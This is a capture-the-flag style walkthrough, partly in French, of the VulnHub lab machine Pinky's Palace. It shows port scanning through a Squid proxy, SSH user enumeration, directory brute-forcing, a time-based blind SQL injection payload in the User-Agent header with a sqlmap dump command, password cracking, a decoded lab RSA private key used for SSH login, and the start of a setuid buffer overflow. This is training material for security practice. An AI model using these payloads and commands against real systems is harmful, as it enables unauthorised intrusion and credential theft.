    VulnHub : Pinky's palace



192.168.1.41

# nmap: nmap --proxy 192.168.1.41 -p-

8080: nginx / 403 all requests
31337: HTTP proxy squid
64666: openssh 7.4p1 

# squid


# openssh 7.4p1
Vuln: user enum
Exploit ssh : https://www.exploit-db.com/exploits/45233
Valid users:
backup
bin 
daemon
games
gnats
irc
list
lp
mail
man
mysql
news
nobody
proxy
root
sshd
sync
sys
uucp
www-data

Testé avec 20 passwords (https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/top-20-common-SSH-passwords.txt)
 --> RAS



# Using HTTP proxy squid as proxy

script bash avec curl --proxy :
8080: nginx : HTTP File Server
3306 : mysql

A tester: nmap --proxy 192.168.1.41:31337
localhost
111/tcp   open  tcpwrapped
8080/tcp  open  tcpwrapped
41017/tcp open  tcpwrapped


#8080

 curl -x http://192.168.1.41:31337
 http://127.0.0.1:8080
<html>        <head>                <title>Pinky's HTTP File Server</title>        </head>        <body>
                <center><h1>Pinky's HTTP File Server</h1></center>
                <center><h3>Under Development!</h3></center>
        </body><style>html{        background: #f74bff;}
</html>

#41017
Erreur avec  curl -x http://192.168.1.41:31337
 http://127.0.0.1:41017

./gobuster ...
dictionnaire : https://raw.githubusercontent.com/daviddias/node-dirbuster/master/lists/directory-list-2.3-medium.txt
gobuster dir -u http://127.0.0.1:8080/
 -p http://192.168.1.41:31337/
 -w /root/directory-list-2.3-medium.txt
=============================================================== 2020/03/02 12:16:13 Starting gobuster =============================================================== /littlesecrets-main (Status: 301)

curl -x http://192.168.1.41:31337
 http://127.0.0.1:8080/littlesecrets-main/
 -v


# 8080 http://127.0.0.1:8080/littlesecrets-main/
  via squid

HTTP/1.1 200 OK
Server: nginx/1.10.3
Date: Mon, 02 Mar 2020 13:06:48 GMT
Content-Type: text/html; charset=UTF-8
X-Cache: MISS from pinkys-palace
X-Cache-Lookup: MISS from pinkys-palace:31337
Via: 1.1 pinkys-palace (squid/3.5.23)
Connection: close

<h3>Incorrect Username or Password</h3>
<!-- Login Attempt Logged -->  =>> Les requetes sontinjectées dans les logs.
On peut manipuler le champs User-Agent:  ' AND (SELECT 7927 FROM (SELECT(SLEEP(5)))hixq) AND 'SHzk'='SHzk ---
pour trouver 


# mysql
Parameter: User-Agent (User-Agent)    
Type: time-based blind    
Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)    
Payload: sqlmap/1.4.2#stable (http://sqlmap.org)
' AND (SELECT 7927 FROM (SELECT(SLEEP(5)))hixq) AND 'SHzk'='SHzk ---

sqlmap -u http://127.0.0.1:8080/littlesecrets-main/login.php
 --proxy=http://192.168.1.41:31337/
 --data="user=a&pass=b" --level=5 --risk=3 --dbms=mysql --database pinky_sec_db --dump

[12:54:31] [WARNING] (case) time-based comparison requires reset of statistical model, please wait.............................. (done) pinky [12:54:53] [INFO] retrieved: f543dbfeaf238729831a321c7a68bee4 [12:56:46] [INFO] retrieved: 1 [12:56:48] [INFO] retrieved: pinkymanage [12:57:24] [INFO] retrieved: d60dffed7cc0d87e1f4a11aa06ca73af [12:59:24] [INFO] retrieved: 2 [12:59:27] [INFO] recognized possible password hashes in column 'pass'

crack : [13:03:00] [INFO] cracked password '3pinkysaf33pinkysaf3' for hash 'd60dffed7cc0d87e1f4a11aa06ca73af'






# ssh

ssh -p 64666 pinkymanage@192.168.1.41 
pinkymanage@192.168.1.41's password:       <<<  3pinkysaf33pinkysaf3

Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64



find / -user pinkymanage  2>/dev/null

ls -alR /var/www

/var/www$ cat ./html/littlesecrets-main/ultrasecretadminf1l35/.ultrasecret 
LS0tLS1CRUdJTiBSU0EgUFJJVkFURSBLRVktLS0tLQpNSUlFcEFJQkFBS0NBUUVBMTZmeEwzLyto
L0lMVFpld2t2ZWtoSVExeWswb0xJK3kzTjRBSXRraGV6MTFJaGE4CkhjN0tPeC9MOWcyamQzSDhk
R1BVZktLcjlzZXF0Zzk3WktBOTVTL3NiNHczUXRsMUFCdS9wVktaQmJHR3NIRy8KeUl2R0VQS1Mr
QlNaNHN0TVc3SG54N2NpTXVod2Nad0xxWm1zeVN1bUVDVHVlUXN3TlBibElUbHJxb2xwWUY4eApl
NDdFbDlwSHdld05XY0lybXFyYXhDSDVUQzdVaGpnR2FRd21XM3FIeXJTcXAvaksvY3RiMVpwblB2
K0RDODMzCnUvVHlqbTZ6OFJhRFpHL2dSQklyTUduTmJnNHBaRmh0Z2JHVk9mN2ZlR3ZCRlI4QmlU
KzdWRmZPN3lFdnlCeDkKZ3hyeVN4dTJaMGFPTThRUjZNR2FETWpZVW5COWFUWXV3OEdQNHdJREFR
QUJBb0lCQUE2aUg3U0lhOTRQcDRLeApXMUx0cU9VeEQzRlZ3UGNkSFJidG5YYS80d3k0dzl6M1Mv
WjkxSzBrWURPbkEwT1VvWHZJVmwvS3JmNkYxK2lZCnJsZktvOGlNY3UreXhRRXRQa291bDllQS9r
OHJsNmNiWU5jYjNPbkRmQU9IYWxYQVU4TVpGRkF4OWdrY1NwejYKNkxPdWNOSUp1eS8zUVpOSEZo
TlIrWVJDb0RLbkZuRUlMeFlMNVd6MnFwdFdNWUR1d3RtR3pPOTY4WWJMck9WMQpva1dONmdNaUVp
NXFwckJoNWE4d0JSUVZhQnJMWVdnOFdlWGZXZmtHektveEtQRkt6aEk1ajQvRWt4TERKcXQzCkxB
N0pSeG1Gbjc3L21idmFEVzhXWlgwZk9jUzh1Z3lSQkVOMFZwZG5GNmtsNnRmT1hLR2owZ2QrZ0Fp
dzBUVlIKMkNCN1BzRUNnWUVBOElXM1pzS3RiQ2tSQnRGK1ZUQnE0SzQ2czdTaFc5QVo2K2JwYitk
MU5SVDV4UkpHK0RzegpGM2NnNE4rMzluWWc4bUZ3c0Jobi9zemdWQk5XWm91V3JSTnJERXhIMHl1
NkhPSjd6TFdRYXlVaFFKaUlQeHBjCm4vRWVkNlNyY3lTZnpnbW50T2liNGh5R2pGMC93bnRqTWM3
M3h1QVZOdU84QTZXVytoZ1ZIS0VDZ1lFQTVZaVcKSzJ2YlZOQnFFQkNQK3hyQzVkSE9CSUVXdjg5
QkZJbS9Gcy9lc2g4dUU1TG5qMTFlUCsxRVpoMkZLOTJReDlZdgp5MWJNc0FrZitwdEZVSkxjazFN
MjBlZkFhU3ZPaHI1dWFqbnlxQ29mc1NVZktaYWE3blBRb3plcHFNS1hHTW95Ck1FRWVMT3c1NnNK
aFNwMFVkWHlhejlGUUFtdnpTWFVudW8xdCtnTUNnWUVBdWJ4NDJXa0NwU0M5WGtlT3lGaGcKWUdz
TE45VUlPaTlrcFJBbk9seEIzYUQ2RkY0OTRkbE5aaFIvbGtnTTlzMVlPZlJYSWhWbTBaUUNzOHBQ
RVZkQQpIeDE4ci8yRUJhV2h6a1p6bGF5ci9xR29vUXBwUkZtbUozajZyeWZCb21RbzUrSDYyVEE3
bUl1d3Qxb1hMNmM2Ci9hNjNGcVBhbmcyVkZqZmNjL3IrNnFFQ2dZQStBenJmSEZLemhXTkNWOWN1
ZGpwMXNNdENPRVlYS0QxaStSd2gKWTZPODUrT2c4aTJSZEI1RWt5dkprdXdwdjhDZjNPUW93Wmlu
YnErdkcwZ016c0M5Sk54SXRaNHNTK09PVCtDdwozbHNLeCthc0MyVng3UGlLdDh1RWJVTnZEck9Y
eFBqdVJJbU1oWDNZU1EvVUFzQkdSWlhsMDUwVUttb2VUSUtoClNoaU9WUUtCZ1FEc1M0MWltQ3hX
Mm1lNTQxdnR3QWFJcFE1bG81T1Z6RDJBOXRlRVBzVTZGMmg2WDdwV1I2SVgKQTlycExXbWJmeEdn
SjBNVmh4Q2pwZVlnU0M4VXNkTXpOYTJBcGN3T1dRZWtORTRlTHRPN1p2MlNWRHI2Y0lyYwpIY2NF
UCtNR00yZVVmQlBua2FQa2JDUHI3dG5xUGY4ZUpxaVFVa1dWaDJDbll6ZUFIcjVPbUE9PQotLS0t
LUVORCBSU0EgUFJJVkFURSBLRVktLS0tLQo=

on base64 decode

-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA16fxL3/+h/ILTZewkvekhIQ1yk0oLI+y3N4AItkhez11Iha8
Hc7KOx/L9g2jd3H8dGPUfKKr9seqtg97ZKA95S/sb4w3Qtl1ABu/pVKZBbGGsHG/
yIvGEPKS+BSZ4stMW7Hnx7ciMuhwcZwLqZmsySumECTueQswNPblITlrqolpYF8x
e47El9pHwewNWcIrmqraxCH5TC7UhjgGaQwmW3qHyrSqp/jK/ctb1ZpnPv+DC833
u/Tyjm6z8RaDZG/gRBIrMGnNbg4pZFhtgbGVOf7feGvBFR8BiT+7VFfO7yEvyBx9
gxrySxu2Z0aOM8QR6MGaDMjYUnB9aTYuw8GP4wIDAQABAoIBAA6iH7SIa94Pp4Kx
W1LtqOUxD3FVwPcdHRbtnXa/4wy4w9z3S/Z91K0kYDOnA0OUoXvIVl/Krf6F1+iY
rlfKo8iMcu+yxQEtPkoul9eA/k8rl6cbYNcb3OnDfAOHalXAU8MZFFAx9gkcSpz6
6LOucNIJuy/3QZNHFhNR+YRCoDKnFnEILxYL5Wz2qptWMYDuwtmGzO968YbLrOV1
okWN6gMiEi5qprBh5a8wBRQVaBrLYWg8WeXfWfkGzKoxKPFKzhI5j4/EkxLDJqt3
LA7JRxmFn77/mbvaDW8WZX0fOcS8ugyRBEN0VpdnF6kl6tfOXKGj0gd+gAiw0TVR
2CB7PsECgYEA8IW3ZsKtbCkRBtF+VTBq4K46s7ShW9AZ6+bpb+d1NRT5xRJG+Dsz
F3cg4N+39nYg8mFwsBhn/szgVBNWZouWrRNrDExH0yu6HOJ7zLWQayUhQJiIPxpc
n/Eed6SrcySfzgmntOib4hyGjF0/wntjMc73xuAVNuO8A6WW+hgVHKECgYEA5YiW
K2vbVNBqEBCP+xrC5dHOBIEWv89BFIm/Fs/esh8uE5Lnj11eP+1EZh2FK92Qx9Yv
y1bMsAkf+ptFUJLck1M20efAaSvOhr5uajnyqCofsSUfKZaa7nPQozepqMKXGMoy
MEEeLOw56sJhSp0UdXyaz9FQAmvzSXUnuo1t+gMCgYEAubx42WkCpSC9XkeOyFhg
YGsLN9UIOi9kpRAnOlxB3aD6FF494dlNZhR/lkgM9s1YOfRXIhVm0ZQCs8pPEVdA
Hx18r/2EBaWhzkZzlayr/qGooQppRFmmJ3j6ryfBomQo5+H62TA7mIuwt1oXL6c6
/a63FqPang2VFjfcc/r+6qECgYA+AzrfHFKzhWNCV9cudjp1sMtCOEYXKD1i+Rwh
Y6O85+Og8i2RdB5EkyvJkuwpv8Cf3OQowZinbq+vG0gMzsC9JNxItZ4sS+OOT+Cw
3lsKx+asC2Vx7PiKt8uEbUNvDrOXxPjuRImMhX3YSQ/UAsBGRZXl050UKmoeTIKh
ShiOVQKBgQDsS41imCxW2me541vtwAaIpQ5lo5OVzD2A9teEPsU6F2h6X7pWR6IX
A9rpLWmbfxGgJ0MVhxCjpeYgSC8UsdMzNa2ApcwOWQekNE4eLtO7Zv2SVDr6cIrc
HccEP+MGM2eUfBPnkaPkbCPr7tnqPf8eJqiQUkWVh2CnYzeAHr5OmA==
-----END RSA PRIVATE KEY-----

ssh -i pinky_rsa pinky@192.168.1.41 -p 64666
Linux pinkys-palace 4.9.0-4-amd64 #1 SMP Debian 4.9.65-3+deb9u1 (2017-12-23) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Feb  2 05:54:01 2018 from 172.19.19.2
pinky@pinkys-palace:~$

$ ls -al
total 44
drwx------ 3 pinky pinky 4096 Feb  2  2018 .
drwxr-xr-x 4 root  root  4096 Feb  2  2018 ..
-rwsr-xr-x 1 root  root  8880 Feb  2  2018 adminhelper

 ./adminhelper aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault

to do ... buffer overflow



